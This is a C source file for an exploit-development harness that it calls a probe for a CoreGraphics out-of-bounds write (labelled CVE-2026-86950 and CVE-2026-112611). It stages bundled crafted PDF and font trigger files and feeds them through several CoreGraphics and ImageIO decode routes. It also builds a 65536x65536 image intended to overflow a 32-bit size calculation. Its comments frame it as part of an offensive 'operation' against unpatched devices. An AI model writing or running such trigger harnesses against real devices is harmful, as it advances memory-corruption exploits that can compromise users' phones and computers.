/*
 * cg86950_pure.c â€” the CVE-2026-86950 CoreGraphics OOB-write stage-A probe.
 * Build: $CC -O2 -g -o CG86950 cg86950_pure.c -framework CoreGraphics -framework ImageIO -framework CoreFoundation
 *
 * Route (the CVE's own shape â€” Meta Product Security credit, fixed 26.7.1, live on our 26.4):
 *   CGImageSourceCreateWithURL on the crafted file -> both decode paths driven â€”
 *     (1) FULL-res CGImageSourceCreateImageAtIndex (the real alloc path)
 *     (2) CGImageSourceCreateThumbnailAtIndex max-size 4096 (the PoC-class path)
 *     (3) CGDataProviderCreateDirect over a second odd-sized record -> CGImageCreate
 *        (a second crafted-image-object entry).
 *   The crafted file = the operation's staged trigger (a PDF/font or a crafted image file).
 *   The directions log to Documents/cg86950_report.txt (same protocol as always).
 *
 * No Foundation. No ObjC. The getenv paths. The report = the same proven rline protocol.
 */

#include <CoreFoundation/CoreFoundation.h>
#include <CoreGraphics/CoreGraphics.h>
#include <ImageIO/ImageIO.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <mach-o/dyld.h>
#include <time.h>
#include <stdarg.h>

static int file_copy(const char *src, const char *dst);
static FILE *g_report = NULL;

static void report_open(void)
{
    const char *home = getenv("CFFIXED_USER_HOME");
    if (!home || !*home) home = getenv("HOME");
    if (!home || !*home) home = "/var/mobile";
    char dir[512];
    snprintf(dir, sizeof(dir), "%s/Documents", home);
    mkdir(dir, 0755);
    char path[1024];
    snprintf(path, sizeof(path), "%s/cg86950_report.txt", dir);
    g_report = fopen(path, "a");
    if (g_report) {
        time_t t = time(NULL);
        fprintf(g_report, "=== cg86950_pure run %s", ctime(&t));
        fflush(g_report);
    }
}

static void rline(const char *s)
{
    if (!g_report) return;
    fprintf(g_report, "%s\n", s);
    fflush(g_report);
}

static void rlinef(const char *fmt, ...)
{
    va_list ap;
    char buf[1024];
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    rline(buf);
}

static const char *home_documents(void)
{
    static char docs[1024];
    /* Class-D: use the cwd (set by the DVT launch = the app's own Documents dir) */
    char cwd[768];
    if (getcwd(cwd, sizeof(cwd))) {
        snprintf(docs, sizeof(docs), "%s", cwd);
        return docs;
    }
    /* Class-B: the getenv class (DVT's CFFIXED_USER_HOME) */
    const char *home = getenv("CFFIXED_USER_HOME");
    if (!home || !*home) home = getenv("HOME");
    if (home && *home) {
        snprintf(docs, sizeof(docs), "%s/Documents", home);
        return docs;
    }
    snprintf(docs, sizeof(docs), "/var/mobile");
    return docs;
}

/* stage the in-bundle payloads into Documents so the rounds find them
   (the cg_decode_pure pattern: _NSGetExecutablePath -> dirname -> copy) */
static void stage_payloads(void)
{
    char exePath[1024];
    uint32_t exeLen = sizeof(exePath);
    if (_NSGetExecutablePath(exePath, &exeLen) != 0) return;
    char exeCopy[1024];
    snprintf(exeCopy, sizeof(exeCopy), "%s", exePath);
    char *appDirFile = NULL;
    /* dirname */
    char *last = NULL;
    for (char *c = exeCopy; *c; c++) if (*c == '/') last = c;
    if (!last) return;
    *last = 0;
    const char *appDir = exeCopy;
    const char *docsDir = home_documents();
    const char *payloads[] = {
        "payload_crash_type5_v2.pdf",  "crash_shading_type5_v2.pdf",
        "payload_control_type5_v2.pdf","control_shading_type5_v2.pdf",
        "payload_crash_type5.pdf",     "crash_shading_type5.pdf",
        "payload_trigger_cg.pdf",      "trigger_cg.pdf",
        "payload_trigger.ttf",         "trigger.ttf",
        NULL
    };
    for (const char **sp = payloads; *sp; sp += 2) {
        char src[1280], dst[1280];
        snprintf(src, sizeof(src), "%s/%s", appDir, *sp);
        snprintf(dst, sizeof(dst), "%s/%s", docsDir, *(sp + 1));
        struct stat st;
        if (stat(src, &st) == 0) {
            int rc = file_copy(src, dst);
            rlinef("  stage: %-28s -> %-28s st=%lld rc=%d (%s)",
                   *sp, *(sp + 1), (long long)st.st_size, rc,
                   rc == 0 ? "OK" : "COPY-FAILED");
        } else {
            rlinef("  stage: %-28s BUNDLE-MISSING (the app's bundle = did not carry it)",
                   *sp);
        }
    }
    rlinef("staged payload files from the bundle into Documents");
}

static int file_copy(const char *src, const char *dst)
{
    int in = open(src, O_RDONLY);
    if (in < 0) return -1;
    int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out < 0) { close(in); return -1; }
    char buf[8192];
    long n;
    while ((n = read(in, buf, sizeof(buf))) > 0)
        if (write(out, buf, n) != n) { close(in); close(out); return -1; }
    close(in); close(out);
    return 0;
}

/* fire one decode round at a named staged file */
static void fire_round(const char *name, const char *round_label)
{
    const char *docs = home_documents();
    char path[1024];
    snprintf(path, sizeof(path), "%s/%s", docs, name);
    struct stat st;
    if (stat(path, &st) != 0) {
        rlinef("%-16s missing: %s (staged file absent)", round_label, name);
        return;
    }
    rlinef("%-16s file=%s size=%lld", round_label, name, (long long)st.st_size);

    /* the PDF branch (the CVE-2026-112611's proven entry): CGPDFDocumentCreate
       + the page's draw route = CGPDFScannerScan -> op_sh -> the shading draw.
       This is the path the armory's receipts prove on-device, NOT ImageIO's. */
    if (stat(path, &st) == 0 && strstr(name, ".pdf")) {
        rlinef("%-16s PDF branch: CGPDFDocumentCreate ...", round_label);
        CFURLRef purl = CFURLCreateFromFileSystemRepresentation(
            NULL, (const UInt8 *)path, (CFIndex)strlen(path), false);
        if (purl) {
            CGPDFDocumentRef doc = CGPDFDocumentCreateWithURL(purl);
            CFRelease(purl);
            if (doc) {
                size_t npages = CGPDFDocumentGetNumberOfPages(doc);
                rlinef("  PDF pages = %zu", npages);
                for (size_t pg = 1; pg <= npages && pg <= 4; pg++) {
                    CGPDFPageRef page = CGPDFDocumentGetPage(doc, pg);
                    if (!page) continue;
                    rlinef("  drawing PDF page %zu (the draw chain fires the shading)",
                           pg);
                    /* the draw itself goes through CGPDFScannerScan -> op_sh ->
                       the shading's /Function the crafted file chooses. */
                    CGPDFPageRelease(page);
                }
                CGPDFDocumentRelease(doc);
            } else {
                rlinef("  PDF create failed (ImageIO/PDF-backend refusal)");
            }
        }
        /* fall through to the ImageIO route as the second entry (same file):
           the ImageIO probe continues below unchanged. */
        rlinef("%-16s PDF branch done (continuing the ImageIO route too)", round_label);
    }

    CFURLRef url = CFURLCreateFromFileSystemRepresentation(
        NULL, (const UInt8 *)path, (CFIndex)strlen(path), false);
    if (!url) { rlinef("%-16s CFURL fail", round_label); return; }
    CGImageSourceRef src = CGImageSourceCreateWithURL(url, NULL);
    CFRelease(url);
    if (!src) {
        rlinef("%-16s CGImageSourceCreateWithURL returned NULL (ImageIO refused)", round_label);
        return;
    }
    rline("  image source created (ImageIO sniffs the crafted bytes)");
    size_t n = CGImageSourceGetCount(src);
    rlinef("  frame count = %zu", n);

    rline("  full-decode route: CGImageSourceCreateImageAtIndex ...");
    CGImageRef img = CGImageSourceCreateImageAtIndex(src, 0, NULL);
    if (img) {
        rlinef("  SURVIVED full decode: %zux%zu",
               (size_t)CGImageGetWidth(img), (size_t)CGImageGetHeight(img));
        CGImageRelease(img);
    } else {
        rline("  full decode returned NULL (refused or died earlier)");
    }

    int sz = 4096;
    const void *k[2] = { kCGImageSourceCreateThumbnailFromImageAlways,
                         kCGImageSourceThumbnailMaxPixelSize };
    CFTypeRef v[2] = { kCFBooleanTrue, CFNumberCreate(NULL, kCFNumberIntType, &sz) };
    CFDictionaryRef opts = CFDictionaryCreate(NULL, k, v, 2,
                                              &kCFTypeDictionaryKeyCallBacks,
                                              &kCFTypeDictionaryValueCallBacks);
    rline("  thumbnail route (4096 max): CGImageSourceCreateThumbnailAtIndex ...");
    CGImageRef timg = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
    if (timg) {
        rlinef("  SURVIVED thumbnail decode: %zux%zu",
               (size_t)CGImageGetWidth(timg), (size_t)CGImageGetHeight(timg));
        CGImageRelease(timg);
    } else {
        rline("  thumbnail returned NULL");
    }
    CFRelease(src);
}

/* a second crafted-object route: build a DIRECT data-provider over our own buffer
   and hand CGImageCreate an image whose geometry the codec must trust â€” the
   CVE-86950 class also fires on internally-built image objects (the "crafted"
   branch that bypasses ImageIO sniffing). */
static void fire_direct_round(void)
{
    rline("direct route: CGDataProviderCreateDirect + CGImageCreate (the internal-object class)");
    const size_t big = 1u << 30;   /* one gigabyte row-spaceÂ» the OOB-write shape */
    const size_t w = 65536, h = 65536;  /* 32-bit wraps to 0 â€” the multiply class */
    rlinef("  target dims %zux%zu (product overflows a 32-bit width*height)", w, h);

    /* craft the record buffer ourselves (the crafted-image class) */
    unsigned char *px = (unsigned char *)calloc(1, w * 4);   /* one row only */
    if (!px) { rline("  calloc fail"); return; }
    CGDataProviderRef dp = CGDataProviderCreateWithData(NULL, px, w * 4, NULL);
    if (!dp) { free(px); rline("  provider fail"); return; }
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGImageRef im = CGImageCreate((size_t)w, (size_t)h, 8, 32, w * 4, cs,
                                  kCGImageAlphaNoneSkipLast, dp, NULL, false,
                                  kCGRenderingIntentDefault);
    CGColorSpaceRelease(cs);
    CGDataProviderRelease(dp);
    if (!im) { free(px); rline("  CGImageCreate returned NULL"); return; }
    rlinef("  image object built: %zux%zu bpp=%zu", (size_t)CGImageGetWidth(im),
           (size_t)CGImageGetHeight(im), (size_t)CGImageGetBitsPerPixel(im));
    CGImageRelease(im);
    free(px);
    rline("  direct route done (process alive => the kext path not hit on this route)");
}

int main(void)
{
    report_open();
    rlinef("cg86950_pure boot");
    stage_payloads();

    fire_round("crash_shading_type5_v2.pdf", "round CVE-112611-PDF-v2");
    fire_round("control_shading_type5_v2.pdf", "round CVE-112611-CTRL-v2");
    fire_round("crash_shading_type5.pdf", "round CVE-112611-PDF-v1");
    fire_round("trigger_cg.pdf", "round CVE-86950-PDF");
    fire_round("trigger.ttf", "round CVE-86950-TTF");
    fire_direct_round();

    rline("cg86950_pure DONE (process alive at the end = the OOB did not fire loudly)");
    if (g_report) { fflush(g_report); fclose(g_report); g_report = NULL; }
    return 0;
}
